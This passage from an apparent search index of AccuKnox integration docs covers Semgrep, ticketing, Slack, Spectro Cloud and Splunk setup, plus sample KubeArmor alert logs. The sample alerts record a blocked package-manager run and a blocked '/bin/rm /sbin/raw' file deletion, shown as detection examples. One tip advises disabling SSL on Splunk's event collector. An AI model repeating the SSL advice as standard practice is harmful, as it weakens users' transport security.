restarts and Logs and Alerts are forwarded to Integrated RSyslog Server from Feeder Service. To view the same check the <code>/var/log</code> folder inside the RSyslog Server. A directory with name <code>feeder-service</code> is created and all the logs are stored inside the same directory as a log file.</p> <p>SCHEDULE DEMO</p>"},{"location":"integrations/semgrep-sast/","title":"Semgrep Integration with GitHub Actions","text":"<p>This document is a step by step guide for integrating Semgrep with AccuKnox. Semgrep can be used for SAST, SCA and secrets scanning for your source code repositories.</p>"},{"location":"integrations/semgrep-sast/#pre-requisites","title":"Pre-requisites","text":"<ul> <li>Access to AccuKnox</li> <li>Access to Semgrep</li> <li>A GitHub repository that you want to scan</li> </ul>"},{"location":"integrations/semgrep-sast/#step-1-create-a-github-workflow","title":"Step 1: Create a GitHub workflow","text":"<p>Add the following workflow file in the GitHub repository under the <code>.github/workflows/semgrep.yaml</code>.</p> <pre><code>on:\n  workflow_dispatch: {}\n  push:\n    branches:\n      - main\nname: Semgrep Findings\njobs:\n  semgrep-sast:\n    name: Semgrep-SAST\n    runs-on: ubuntu-20.04\n    container:\n      image: semgrep/semgrep\n    steps:\n      - uses: actions/checkout@v4\n      - name: Semgrep scan\n        run: |\n          # Run Semgrep scan and store the output in JSON\n          semgrep scan --json --json-output /tmp/semgrep.json\n        env:\n          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}\n\n      - name: Upload report to AccuKnox\n        run: |\n          curl --location --request POST \\\n          \"https://cspm.stage.accuknox.com/api/v1/artifact/?tenant_id=${{ secrets.ACCUKNOX_TENANT_ID }}&amp;data_type=SG&amp;save_to_s3=true&amp;label_id=${{ secrets.ACCUKNOX_LABEL }}\" \\\n          --header \"Tenant-Id: ${{ secrets.ACCUKNOX_TENANT_ID }}\" \\\n          --header \"Authorization: Bearer ${{ secrets.ACCUKNOX_TOKEN }}\" \\\n          --form \"file=@/tmp/semgrep.json\"\n</code></pre>"},{"location":"integrations/semgrep-sast/#step-2-configure-the-secrets-in-github-repository","title":"Step 2: Configure the secrets in GitHub repository","text":"<p>You need to configure the following secret in the GitHub repository:</p> <ul> <li> <p><code>SEMGREP_APP_TOKEN</code></p> </li> <li> <p><code>ACCUKNOX_LABEL</code></p> </li> <li> <p><code>ACCUKNOX_TENANT_ID</code></p> </li> <li> <p><code>ACCUKNOX_TOKEN</code></p> </li> </ul> <p>For configuring <code>SEMGREP_APP_TOKEN</code> navigate to the Semgrep &gt; Settings &gt; Tokens and click on create new token button.</p> <p></p> <p>Copy that token and configure that in GitHub repostiory.</p> <p>Now navigate to the AccuKnox &gt; Settings &gt; Labels and click on the create label button.</p> <p></p> <p>Give your label a name and click on the save button. Once the label is created configure it as a secret in GitHub.</p> <p></p> <p>For creating a token navigate to the Settings &gt; Tokens page, and click on the create button.</p> <p></p> <p>Give your token a name and click on the generate button:</p> <p></p> <p>Copy the Tenant ID and token and configure those as secretes in GitHub.</p> <p></p>"},{"location":"integrations/semgrep-sast/#step-3-trigger-the-pipeline","title":"Step 3: Trigger the pipeline","text":"<p>Once you have added the workflow and configured the secrets you can push the commit to the GitHub for triggering the pipeline.</p> <p></p> <p>Once the pipeline is completed successfully you can see the results in the AccuKnox. Navigate to the AccuKnox &gt; Issues &gt; Findings and select the Semgrep Findings.</p> <p></p>"},{"location":"integrations/servicedesk-plus/","title":"ServiceDesk Plus (SDP) Integration","text":"<p>This guide provides step-by-step instructions to integrate ManageEngine ServiceDesk Plus (SDP) Cloud with the AccuKnox Control Plane. Once configured, AccuKnox can automatically create, update, and manage tickets in SDP based on CSPM (Cloud Security Posture Management) alerts.</p>"},{"location":"integrations/servicedesk-plus/#1-configure-servicedesk-plus-in-accuknox-control-plane","title":"1. Configure ServiceDesk Plus in AccuKnox Control Plane","text":""},{"location":"integrations/servicedesk-plus/#step-1-register-application-on-zoho","title":"Step 1: Register Application on Zoho","text":"<p>To enable API access for SDP Cloud, you first need to register an application on Zoho:</p> <ol> <li>Go to Zoho API Console.</li> <li>Create a new client with the following details:</li> <li>Client Type: Server-based or Web-based</li> <li>Homepage URL: <code>https://app.accuknox.com/</code></li> <li>Redirect URL: (copy this from the AccuKnox Control Plane, you'll get it in Step #2, point 3 below)</li> <li>Save the Client ID and Client Secret. You will use these in the AccuKnox platform.</li> </ol> <p> </p> <p>Tip</p> <p>Always copy the Redirect URL directly from AccuKnox instead of typing manually to avoid authentication errors.</p> <p>Warning</p> <p>If authentication fails, check that the Redirect URL in Zoho and AccuKnox match exactly, including trailing slashes.</p>"},{"location":"integrations/servicedesk-plus/#step-2-configure-integration-in-accuknox","title":"Step 2: Configure Integration in AccuKnox","text":"<ol> <li>Log in to AccuKnox Control Plane.</li> <li>Navigate to: Settings \u2192 Integrations \u2192 CSPM \u2192 ServiceDesk Plus.</li> <li>On the integration page, fill in:</li> <li>Integration Name</li> <li>Client ID (from Zoho)</li> <li>Client Secret (from Zoho)</li> <li>Homepage URL \u2192 <code>https://app.accuknox.com/</code></li> <li>Redirect URL \u2192 (to be pasted in Zoho)</li> <li>Click Test Connection. Once validated, the integration is active.</li> </ol> <p>Tip</p> <p>Use a clear Integration Name (e.g., <code>SDP-Prod</code> or <code>SDP-Test</code>) to easily identify multiple environments.</p>"},{"location":"integrations/servicedesk-plus/#2-configure-ticket-creation-syncing","title":"2. Configure Ticket Creation &amp; Syncing","text":"<p>AccuKnox allows you to define rules for how CSPM alerts are turned into SDP tickets.</p> <p></p>"},{"location":"integrations/servicedesk-plus/#ticket-syncing-options","title":"Ticket Syncing Options","text":"<p>These options allow you to automate and customize ticket management:</p> <ul> <li> <p>Automate Ticket Creation   Automatically create a new ticket in the right project and assign it whenever a new CSPM alert is detected.</p> </li> <li> <p>Set Priority Automatically   Map alert severity (Critical, High, Medium) to corresponding ticket priority (Highest, Medium). This ensures high-risk issues are always addressed first.</p> </li> <li> <p>Update Alerts with Comments   Configure rules so that certain comments update alert status automatically. For example, if a ticket comment includes false positive, the alert can be auto-suppressed.</p> </li> <li> <p>Build Reusable Templates   Save configurations as templates to apply consistent workflows across different types of alerts.</p> </li> </ul> <p>Tip</p> <p>Create separate templates for different alert categories (e.g., compliance violations vs. misconfigurations) to streamline triage.</p> <p>Warning</p> <p>If tickets are not being created, verify that your SDP account has the required API access permissions.</p>"},{"location":"integrations/servicedesk-plus/#additional-syncing-features","title":"Additional Syncing Features","text":"<ul> <li> <p>Auto Maintain Tickets   Keeps tickets updated whenever the underlying alert changes. If new findings are added to an alert in AccuKnox, the system updates the corresponding SDP ticket.</p> </li> <li> <p>Keep Syncing Closed Tickets   Prevents duplication of tickets for recurring issues. If a closed ticket's alert reoccurs, the same ticket is reopened instead of creating a new one.</p> </li> </ul> <p>Tip</p> <p>Enable both Auto Maintain Tickets and Keep Syncing Closed Tickets to ensure long-running or recurring issues are tracked in one place.</p> <p>Warning</p> <p>If tickets don't reopen as expected, verify that the SDP project settings allow reopening of closed tickets.</p>"},{"location":"integrations/servicedesk-plus/#3-create-and-manage-tickets-from-accuknox","title":"3. Create and Manage Tickets from AccuKnox","text":"<p>Once the integration is complete, you can start creating and managing SDP tickets directly from AccuKnox:</p> <ol> <li> <p>Go to the Cloud Inventory Assets page.    </p> </li> <li> <p>Select an asset to view its findings.    </p> </li> <li> <p>Choose a finding and click Create Ticket.     </p> </li> <li> <p>In the Ticket Configuration Selection, pick the template created during setup.    Example: Ticketing CSPM template.</p> </li> <li>The template will automatically populate ticket fields with finding details. Review and adjust:</li> <li>Assignee</li> <li>Priority</li> <li> <p>Ticket description/mapping</p> </li> <li> <p>Click Create Ticket.    </p> </li> </ol>"},{"location":"integrations/servicedesk-plus/#after-ticket-creation","title":"After Ticket Creation","text":"<ul> <li>Once the ticket is created, you will see full details (status, assignee, severity, etc.) directly in AccuKnox.</li> <li>If syncing options were enabled, editing status or comments in AccuKnox reflects in SDP.</li> <li>Comments made in AccuKnox appear in the corresponding SDP ticket.</li> <li>Closing a ticket in AccuKnox automatically marks it as resolved in SDP.</li> </ul> <p>You can also view and manage all tickets centrally at: https://app.accuknox.com/tickets</p> <p>Tip</p> <p>Use the AccuKnox Tickets page to track all tickets across projects in one place instead of checking each alert individually.</p> <p>Warning</p> <p>If ticket comments are not syncing, verify that the comment sync checkbox is enabled in the ticket configuration.</p> <p></p> <p></p> <p></p>"},{"location":"integrations/servicedesk-plus/#summary","title":"Summary","text":"<p>By integrating SDP Cloud into AccuKnox, you:</p> <ul> <li>Automate the conversion of CSPM alerts into actionable tickets</li> <li>Maintain a single source of truth across AccuKnox and SDP</li> <li>Reduce manual work and ensure timely remediation of security issues</li> <li>Improve collaboration between Security and IT teams with synchronized workflows</li> </ul> <p>Note</p> <p>This integration ensures your CSPM alerts are automatically tracked, prioritized, and resolved in ServiceDesk Plus without leaving the AccuKnox platform.</p>"},{"location":"integrations/servicenow/","title":"ServiceNow Integration","text":"<p>Integrate AccuKnox with ServiceNow and receive AccuKnox alert notifications in your ServiceNow account. With this integration, you can automate the process of generating ServiceNow tickets with your existing security workflow.</p> <p>To set up this integration, you need to coordinate with your ServiceNow administrator and gather the inputs needed to enable communication between AccuKnox and ServiceNow.</p>"},{"location":"integrations/servicenow/#integration","title":"Integration","text":""},{"location":"integrations/servicenow/#prerequisites","title":"Prerequisites","text":"<ul> <li> <p>The ServiceNow Integration requires the following: Instance URL, Instance Username and Instance Password.</p> <ul> <li>Please refer to the ServiceNow Documentation for how to create an instance and obtain the required credentials.</li> </ul> </li> </ul>"},{"location":"integrations/servicenow/#steps-for-integration","title":"Steps for integration","text":"<ul> <li> <p>Navigate to Settings \u2192 Integrations \u2192 CSPM tab</p> </li> <li> <p>Click on add connector and select ServiceNow</p> </li> </ul> <p></p> <ul> <li> <p>Enter the following details to configure the ServiceNow Integration:</p> <ul> <li> <p>Integration Name: Enter the name for the integration. You can set any name. e.g.,<code>MyServiceNow</code></p> </li> <li> <p>ServiceNow Instance URL: The URL of the ServiceNow instance. e.g.,<code>https://my-instance.service-now.com</code></p> </li> <li> <p>Instance Username: The Username associated with the instance. e.g.,<code>admin</code></p> </li> <li> <p>Secret: The current password of the instance.</p> </li> </ul> </li> </ul> <p></p> <ul> <li> <p>Click on the ServiceNow ticketing backend</p> </li> <li> <p>Click on Add Configuration and enter the following details:</p> <ul> <li> <p>Configuration name: this name will be displayed under ticket configuration while creating tickets.</p> </li> <li> <p>Default template: to specify the of data that this configuration will be used for making tickets.</p> </li> <li> <p>Issue Type: You can choose from the dropdown.</p> </li> <li> <p>Fill the priority mapping according to your choice and press Save.</p> </li> </ul> </li> </ul> <p></p> <p>You can now create tickets on ServiceNow through the ticketing configuration.</p>"},{"location":"integrations/slack/","title":"Slack Integration","text":"<p>To send an alert notification via Slack you must first set up the Slack notification Channel.</p>"},{"location":"integrations/slack/#integration-of-slack","title":"Integration of Slack:","text":""},{"location":"integrations/slack/#a-prerequisites","title":"a. Prerequisites:","text":"<p>You need a valid and active account in Slack. After logging into your Slack channel, you must generate a Hook URL.</p> <p>Note : To generate Hook URL follow the steps, Webhooks-for-Slack .</p>"},{"location":"integrations/slack/#b-steps-to-integrate","title":"b. Steps to Integrate:","text":"<ul> <li>Go to Channel Integration.</li> <li>Click integrate now on Slack.</li> </ul> <ul> <li> <p>Fill up the following fields:</p> </li> <li> <p>Integration Name: Enter the name for the integration. You can set any name. e.g., <code>Container Security Alerts</code></p> </li> <li> <p>Hook URL: Enter your generated slack hook URL here. e.g., <code>https://hooks.slack.com/services/T000/B000/XXXXXXX</code></p> </li> <li> <p>Sender Name: Enter the sender name here. e.g., <code>AccuKnox User</code></p> </li> <li> <p>Channel Name: Enter your slack channel name here. e.g., <code>livealertsforcontainer</code></p> </li> <li> <p>Click Test to check the new functionality, You will receive the test message on configured slack channel. <code>Test message Please ignore !!</code></p> </li> <li> <p>Click Save to save the Integration. You can now configure Alert Triggers for Slack Notifications.</p> </li> </ul> <p>SCHEDULE DEMO</p>"},{"location":"integrations/spectrocloud/","title":"Deploy AccuKnox agents via Spectro Cloud Palette","text":"<p>This document provides instructions on using Spectro Cloud Palette to onboard the clusters to AccuKnox via the use of Cluster Add On Profiles. Essentially simplifying the onboarding of clusters already connected to the Spectro Cloud platform.</p>"},{"location":"integrations/spectrocloud/#prerequisites","title":"Prerequisites","text":""},{"location":"integrations/spectrocloud/#add-helm-charts","title":"Add Helm Charts","text":"<p>To add the helm charts to be deployed, navigate to Tenant Settings \u2192 Infrastructure \u2192 Registries and click on Add New Helm Registry</p> <p></p> <p>Enter the following:</p> <ul> <li> <p>Name: KubeArmor</p> </li> <li> <p>Endpoint: <code>https://kubearmor.github.io/charts</code></p> </li> </ul> <p>Click on Confirm</p> <p></p> <p>Follow the same steps as above and add another helm chart registry for the AccuKnox Enterprise Agents. The following details will be used to add the registry:</p> <ul> <li> <p>Name: AccuKnox-Agents</p> </li> <li> <p>Endpoint: <code>http://agents.accuknox.com</code></p> </li> </ul>"},{"location":"integrations/spectrocloud/#generate-access-key","title":"Generate Access Key","text":"<p>On the AccuKnox platform, navigate to Settings \u2192 User Management. Click on the three dots to the right of your username and select Get Access Key</p> <p></p> <p>In the pop up,</p> <ul> <li> <p>Enter a Name for the access key</p> </li> <li> <p>Set the Expiration time for the key's usage</p> </li> <li> <p>Select a sufficient role, for the purpose of onboarding cluster</p> </li> <li> <p>Enter the maximum number of clusters that can be onoarded using this access key</p> </li> </ul> <p></p> <p>Click on Generate and copy the access key.</p>"},{"location":"integrations/spectrocloud/#configuration","title":"Configuration","text":""},{"location":"integrations/spectrocloud/#create-a-cluster-profile","title":"Create a Cluster Profile","text":"<p>Navigate to Profiles and click on Add Cluster Profile</p> <p></p> <p>In the following screen, enter a Name for the profile, a version number and select Type as Add-On. Click on Next</p> <p></p> <p>Click on Add Helm chart and select Public packs</p> <p></p> <p>Select the KubeArmor Registry and click on KubeArmor Operator</p> <p></p> <p>In the values for the helm chart, enter the namespace to deploy the agent and set <code>autoDeploy</code> to <code>true</code>. Click on Confirm &amp; Create</p> <p></p> <p>Select Add Helm Charts \u2192 Public packs again. This time, select the AccuKnox-Agents Registry and click on accuknox-agents</p> <p></p> <p>In the values file, enter the namespace and set the following variables with regards to the AccuKnox platform in use:</p> <ul> <li> <p><code>ppsHost</code>: <code>pps.&lt;env-name&gt;.accuknox.com</code></p> </li> <li> <p><code>knoxGateway</code>: <code>knox-gw.&lt;env-name&gt;.accuknox.com:3000</code></p> </li> <li> <p><code>spireHost</code>: <code>spire.&lt;env-name&gt;.accuknox.com</code></p> </li> </ul> <p>Note: The values for the above variables can be fetched from the cluster onboarding screen in the AccuKnox platform. The accessKey should be replaced by the user token generated on AccuKnox to reuse this profile</p> <ul> <li> <p><code>clusterName</code>: A name to uniquely identify the cluster on AccuKnox</p> </li> <li> <p><code>tokenURL:</code> Value will be <code>cwpp.&lt;env-name&gt;.accuknox.com</code> where  could be demo or other depending on the AccuKnox platform URL. <li> <p><code>accessKey</code>: The Access Key that was generated from AccuKnox</p> </li> <p>Click on Confirm &amp; Create</p> <p></p> <p>Click on Next after creating the two layers</p> <p></p> <p>Click on Finish Configuration to finalize setting up the Cluster Profile</p> <p></p>"},{"location":"integrations/spectrocloud/#deploying-agents","title":"Deploying Agents","text":"<p>Navigate to Profiles and select the Cluster Profile created for AccuKnox</p> <p></p> <p>Click on Deploy</p> <p></p> <p>Select the cluster and click on Confirm</p> <p></p> <p>Edit the <code>clusterName</code> and provide a unique name for identification in the AccuKnox platform. It can contain alphanumeric characters with an hyphen in between the characters.</p> <p>Click on Save after confirming the details.</p> <p></p> <p>To onboard any clusters, the same profile can be reused by changing only the <code>clusterName</code> parameter.</p>"},{"location":"integrations/splunk/","title":"Splunk Integration","text":"<p>Splunk is a software platform to search, analyze, and visualize machine-generated data gathered from websites, applications, sensors, and devices.</p> <p>AccuKnox integrates with Splunk and monitors your assets and sends alerts for resource misconfigurations, compliance violations, network security risks, and anomalous user activities to Splunk. To forward the events from your workspace you must have Splunk Depolyed and HEC URL generated first for Splunk Integration.</p>"},{"location":"integrations/splunk/#integration-of-splunk","title":"Integration of Splunk","text":""},{"location":"integrations/splunk/#a-prerequisites","title":"a. Prerequisites","text":"<p>Set up Splunk HTTP Event Collector (HEC) to view alert notifications from AccuKnox in Splunk. Splunk HEC lets you send data and application events to a Splunk deployment over the HTTP and Secure HTTP (HTTPS) protocols.</p> <p>To set up HEC, use instructions in Splunk documentation. For source type,_json is the default; if you specify a custom string on AccuKnox, that value will overwrite anything you set here.</p> <p>Select Settings &gt; Data inputs &gt; HTTP Event Collector and make sure you see HEC added in the list and that the status shows that it is Enabled .</p>"},{"location":"integrations/splunk/#b-steps-to-integrate","title":"b. Steps to Integrate","text":"<ul> <li>Go to Settings\u2192Integration.</li> <li>Click integrate now on Splunk.</li> </ul> <ul> <li>Enter the following details to configure Splunk.</li> <li> <p>Select the Splunk App : From the dropdown, Select Splunk Enterprise.</p> <ul> <li>Integration Name: Enter the name for the integration. You can set any name. e.g., <code>sh Test Splunk</code></li> <li>Splunk HTTP event collector URL: Enter your Splunk HEC URL generated earlier.e.g., <code>sh https://splunk-xxxxxxxxxx.com/services/collector</code></li> <li>Index: Enter your Splunk Index, once created while creating HEC. e.g., <code>sh main</code></li> <li>Token: Enter your Splunk Token, generated while creating HEC URL. e.g., <code>sh x000x0x0x-0xxx-0xxx-xxxx-xxxxx00000</code></li> <li> <p>Source: Enter the source as http: <code>sh kafka</code></p> </li> <li> <p>Source Type: Enter your Source Type here, this can be anything and the same will be attach to the event type forwarded to splunk. e.g.,<code>sh _json</code></p> </li> <li> <p>Click Test to check the new functionality, You will receive the test message on configured slack channel. e.g.,<code>sh Test Message host = xxxxxx-deployment-xxxxxx-xxx00 source = http:kafka sourcetype = trials</code></p> </li> <li>Click Save to save the Integration. You can now configure Alert Triggers for Slack Notifications.</li> </ul> </li> </ul> <p>SCHEDULE DEMO</p>"},{"location":"integrations/splunk_feeder_kubearmor/","title":"Splunk Integration With KubeArmor","text":""},{"location":"integrations/splunk_feeder_kubearmor/#introduction","title":"Introduction","text":"<p>The AccuKnox Splunk App is designed to deliver operational reporting as well as a simplified and configurable dashboard. Users can view the real-time alerts in form of logs and telemetries.</p> <p>Important features</p> <ul> <li> <p>Dashboard to track the real time alerts generated from K8s cluster.</p> </li> <li> <p>Data models with pivots for easy access to data and visualization.</p> </li> <li> <p>Filter out the Alerts based on different namespaces, pods, operations, severity, tags and the actions of policies.</p> </li> <li> <p>Drill-down ability to see how the alerts generated, what policy was violated and what was the result for the same.</p> </li> </ul>"},{"location":"integrations/splunk_feeder_kubearmor/#installation","title":"Installation","text":""},{"location":"integrations/splunk_feeder_kubearmor/#prerequisites","title":"Prerequisites :","text":"<p>1. K8s Cluster with Feeder-Service and KubeArmor.</p> <p>2. An active Splunk Deployment and Access to the same.</p> <p>To depoy Splunk on Kubernetes Cluster follow https://splunk.github.io/splunk-operator/ and for Linux follow https://docs.splunk.com/Documentation/Splunk/9.0.1/Installation/InstallonLinux</p>"},{"location":"integrations/splunk_feeder_kubearmor/#step1feeder-service-installation-on-kubernetes-cluster","title":"Step1:Feeder Service Installation on Kubernetes Cluster","text":"<p>1 . Assuming the user is inside their K8s Cluster, type the following command pull the Feeder Service Helm Chart.</p> <pre><code>helm pull oci://public.ecr.aws/k9v9d5v2/accuknox-agents --version 0.1.0 --untar\n</code></pre> <p>2 . Now change directory to accuknox-agents</p> <pre><code>cd accuknox-agents\n</code></pre> <ol> <li>Edit the yaml file install-feeder-only.yaml to add the Splunk variables required to forward the events.</li> </ol> <pre><code>vi install-feeder-only.yaml\n</code></pre> <ol> <li>Update the following fields in the YAML file and save it.</li> </ol> Fields Values <code>clusterName</code> Add <code>clustername</code> from which data will be forwarded. <code>SPLUNK_FEEDER_ENABLED</code> Setting this to <code>true</code> forward the Policy Violated Alerts to Splunk <code>SPLUNK_FEEDER_URL</code> Add<code>HEC URL</code> of your Splunk Deployment, e.g., <code>https://splunk-xxxxxxxxxx.com/services/collector</code> <code>SPLUNK_FEEDER_TOKEN</code> Enter your Splunk HEC Token here, created while adding a new HEC For example: <code>x000x0x0x-0xxx-0xxx-xxxx-xxxxx00000</code> <code>SPLUNK_FEEDER_INDEX</code> Enter your Splunk HEC Index here, created while adding a new HEC For example: <code>main</code> <code>SPLUNK_FEEDER_SOURCE</code> User can add any source, For example: <code>KubeArmor</code> <code>SPLUNK_FEEDER_SOURCE_TYPE</code> User needs to add source type as <code>json</code> <code>SPLUNK_ALERTS_ENABLED</code> Setting this to <code>true</code> forward the Policy Violated Alerts to Splunk, To forward any alerts this needs to be true <code>SPLUNK_LOGS_ENABLED</code> Setting this to <code>true</code> forward the Container Logs to Splunk. <ol> <li>Now install Feeder Service using the below command</li> </ol> <pre><code>helm install feeder-service oci://public.ecr.aws/k9v9d5v2/accuknox-agents --version 0.1.0 --values=install-feeder-only.yaml  -n accuknox-agents --create-namespace\n</code></pre> <p><code>Note*: To edit the Splunk Variable anytime in future, User can edit the config-map named splunk-vars in accuknox-agents namespace, to edit use this command: kubectl edit cm splunk-vars -n accuknox-agents</code></p>"},{"location":"integrations/splunk_feeder_kubearmor/#step2-accuknox-splunk-app-installation-on-splunk-deployment","title":"Step2: AccuKnox Splunk App Installation on Splunk Deployment","text":""},{"location":"integrations/splunk_feeder_kubearmor/#where-to-install-it","title":"Where to install it?","text":"<p>Splunk App can be installed on Splunk Enterprise Deployment done on K8s or VM. User can install the App using three different ways.</p>"},{"location":"integrations/splunk_feeder_kubearmor/#option-1-install-from-file","title":"Option 1: Install from File","text":"<p>This App can be installed by Uploading the file to the Splunk UI.</p> <ol> <li>Download the AccuKnox Splunk App file, by typing the following command. This file can be downloaded anywhere from where the user can upload the file to Splunk UI.</li> </ol> <pre><code>git clone https://github.com/accuknox/splunk.git AccuKnox\ntar -czvf AccuKnox.tar.gz AccuKnox\n</code></pre> <ol> <li>Log in to your Splunk Deployment. </li> <li>Click on the gear  icon next to Apps. </li> <li>This will navigate you to the Apps Dashboard. On the top right, click on Install app from file. </li> <li>This will navigate to Upload App Screen. Select AccuKnox.tar.gz file downloaded in the first step, and upload. In case you are updating the app and it\u2019s already installed, mark the check box for Upgrade App.    </li> <li>Once Uploaded the App will be installed on the Splunk Deployment, with a confirmation message, \u201c*****AccuKnox\" was installed successfully.* Click on**Launch App** to view the App.</li> </ol> <p> 7. You can Restart Splunk for the App to work properly. Go to Settings &gt; Server Control &gt; Restart Splunk, Restarting the app will take approx. 1-2 minutes.</p> <p> 8. Wait for Splunk to Restart And you can log in back to see the AccuKnox App in the App section.</p> <p> 9. Click on the AccuKnox App to launch the App. This will navigate you to the App dashboard.</p> <p></p> <p>Note:</p> <ol> <li> <p>If Dashboards shows no data, you need to configure the HEC on Splunk and Forward the data first, check below how to configure and create HEC and forward the data.</p> </li> <li> <p>If data is not being pushed, Login to Splunk &gt; Setting &gt; Data Input &gt; Select HTTP Event Collector &gt; Global Settings &gt; Disable SSL if Enabled by unchecking the box.</p> </li> <li> <p>We recommend restarting the Splunk Deployment after App Installation.</p> </li> </ol>"},{"location":"integrations/splunk_feeder_kubearmor/#option-2-install-the-app-from-splunkbase","title":"Option 2: Install the App from SplunkBase","text":"<p>Install the AccuKnox App by downloading it from the App homepage.</p> <p></p>"},{"location":"integrations/splunk_feeder_kubearmor/#option-3-install-from-github","title":"Option 3: Install from GitHub","text":"<p>This App is available on SplunkBase and Github. Optionally, you can clone the GitHub repository to install the App. Please feel free to submit contributions to the App using pull requests on GitHub.</p> <ol> <li> <p>Locate the Splunk Deployment done in your environment.</p> </li> <li> <p>Navigate to the Splunk App directory. For Linux users <code>/opt/splunk/etc/apps</code> and windows users <code>\\Program Files\\Splunk\\etc\\apps</code></p> </li> </ol> <p>From the directory <code>$SPLUNK_HOME/etc/apps/</code>, type the following command:</p> <pre><code>git clone https://github.com/accuknox/splunk.git AccuKnox\n</code></pre> <p>SCHEDULE DEMO</p>"},{"location":"integrations/telemetry-alerts/","title":"Telemetry Alerts","text":"<p>Rich contextual alerts are provided by AccuKnox CNAPP to give comprehensive visibility of the cloud assets along with a dashboard view. Policy related alerts can be forwarded from Accuknox's open-source KubeArmor to the SaaS platform. User can also forward the alerts from AccuKnox SaaS using the channel integration option to other SIEM tools like Splunk, ELK, Rsyslog, etc.., These alerts can also help accelerate troubleshooting by providing a single source of truth.</p>"},{"location":"integrations/telemetry-alerts/#process-alert","title":"Process Alert","text":"<p><pre><code>{\n  \"ClusterName\": \"default\",\n  \"HostName\": \"aks-agentpool-16128849-vmss000001\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"PodName\": \"wordpress-787f45786f-2q9wf\",\n  \"Labels\": \"app=wordpress\",\n  \"ContainerID\": \"72de193fc8d849cd052affae5a53a27111bcefb75385635dcb374acdf31a5548\",\n  \"ContainerName\": \"wordpress\",\n  \"ContainerImage\": \"docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\",\n  \"HostPPID\": 495804,\n  \"HostPID\": 495877,\n  \"PPID\": 309835,\n  \"PID\": 309841,\n  \"ParentProcessName\": \"/bin/bash\",\n  \"ProcessName\": \"/usr/bin/apt\",\n  \"PolicyName\": \"harden-wordpress-pkg-mngr-exec\",\n  \"Severity\": \"5\",\n  \"Tags\": \"NIST,NIST_800-53_CM-7(4),SI-4,process,NIST_800-53_SI-4\",\n  \"ATags\": [\n    \"NIST\",\n    \"NIST_800-53_CM-7(4)\",\n    \"SI-4\",\n    \"process\",\n    \"NIST_800-53_SI-4\"\n  ],\n  \"Message\": \"Alert! Execution of package management process inside container is denied\",\n  \"Type\": \"MatchedPolicy\",\n  \"Source\": \"/bin/bash\",\n  \"Operation\": \"Process\",\n  \"Resource\": \"/usr/bin/apt\",\n  \"Data\": \"syscall=SYS_EXECVE\",\n  \"Enforcer\": \"AppArmor\",\n  \"Action\": \"Block\",\n  \"Result\": \"Permission denied\"\n}\n</code></pre> File Alert <pre><code>{\n  \"ClusterName\": \"default\",\n  \"HostName\": \"aks-agentpool-16128849-vmss000001\",\n  \"NamespaceName\": \"wordpress-mysql\",\n  \"PodName\": \"wordpress-787f45786f-2q9wf\",\n  \"Labels\": \"app=wordpress\",\n  \"ContainerID\": \"72de193fc8d849cd052affae5a53a27111bcefb75385635dcb374acdf31a5548\",\n  \"ContainerName\": \"wordpress\",\n  \"ContainerImage\": \"docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845\",\n  \"HostPPID\": 495804,\n  \"HostPID\": 496390,\n  \"PPID\": 309835,\n  \"PID\": 309842,\n  \"ParentProcessName\": \"/bin/bash\",\n  \"ProcessName\": \"/bin/rm\",\n  \"PolicyName\": \"harden-wordpress-file-integrity-monitoring\",\n  \"Severity\": \"1\",\n  \"Tags\": \"NIST,NIST_800-53_AU-2,NIST_800-53_SI-4,MITRE,MITRE_T1036_masquerading,MITRE_T1565_data_manipulation\",\n  \"ATags\": [\n    \"NIST\",\n    \"NIST_800-53_AU-2\",\n    \"NIST_800-53_SI-4\",\n    \"MITRE\",\n    \"MITRE_T1036_masquerading\",\n    \"MITRE_T1565_data_manipulation\"\n  ],\n  \"Message\": \"Detected and prevented compromise to File integrity\",\n  \"Type\": \"MatchedPolicy\",\n  \"Source\": \"/bin/rm /sbin/raw\",\n  \"Operation\": \"File\",\n  \"Resource\": \"/sbin/raw\",\n  \"Data\": \"syscall=SYS_UNLINKAT flags=\",\n  \"Enforcer\": \"AppArmor\",\n  \"Action\": \"Block\",\n  \"Result\": \"Permission denied\"\n}\n</code></pre> Network Alert <pre><code>{\n  \"ClusterName\": \"default\",\n  \"HostName\": \"aks-agentpool-16128849-vmss000000\",\n  \"NamespaceName\": \"default\",\n  \"PodName\": \"vault-0\",\n  \"Labels\": \"app.kubernetes.io/instance=vault,app.kubernetes.io/name=vault,component=server,helm.sh/chart=vault-0.24.1,statefulset.kubernetes.io/pod-name=vault-0\",\n  \"ContainerID\": \"775fb27125ee8d9e2f34d6731fbf3bf677a1038f79fe8134856337612007d9ae\",\n  \"ContainerName\": \"vault\",\n  \"ContainerImage\": \"docker.io/hashicorp/vault:1.13.1@sha256:b888abc3fc0529550d4a6c87884419e86b8cb736fe556e3e717a6bc50888b3b8\",\n  \"HostPPID\": 2203523,\n  \"HostPID\": 2565259,\n  \"PPID\": 2203523,\n  \"PID\": 3558570,\n  \"UID\": 100,\n  \"ParentProcessName\": \"/usr/bin/containerd-shim-runc-v2\",\n  \"ProcessName\": \"/bin/vault\",\n  \"PolicyName\": \"ksp-vault-network\",\n  \"Severity\": \"8\",\n  \"Type\": \"MatchedPolicy\",\n  \"Source\": \"/bin/vault status -tls-skip-verify\",\n  \"Operation\": \"Network\",\n  \"Resource\": \"domain=AF_UNIX type=SOCK_STREAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0\",\n  \"Data\": \"syscall=SYS_SOCKET\",\n  \"Enforcer\": \"eBPF Monitor\",\n  \"Action\": \"Audit\",\n  \"Result\": \"Passed\"\n}\n</code></pre></p>"},{"location":"integrations/telemetry-alerts/#alerts-format","title":"Alerts Format","text":"Alert Field Description Example Action specifies the action of the policy it has matched. Audit/Block ClusterName gives information about the cluster for which the alert was generated aks-test-cluster Operation gives details about what type of operation happened in the pod File/Process/Network ContainerID information about the container ID where the policy violation or alert got generated e10d5edb62ac2daa4eb9a2146e2f2cfa87b6a5f30bd3a ContainerImage shows the image that was used to spin up the container docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f ContainerName specifies the Container name where the alert got generated mysql Data shows the system call that was invoked for this operation syscall=SYS_EXECVE Enforcer it specifies the name of the LSM that has enforced the policy AppArmor/BPFLSM HostName shows 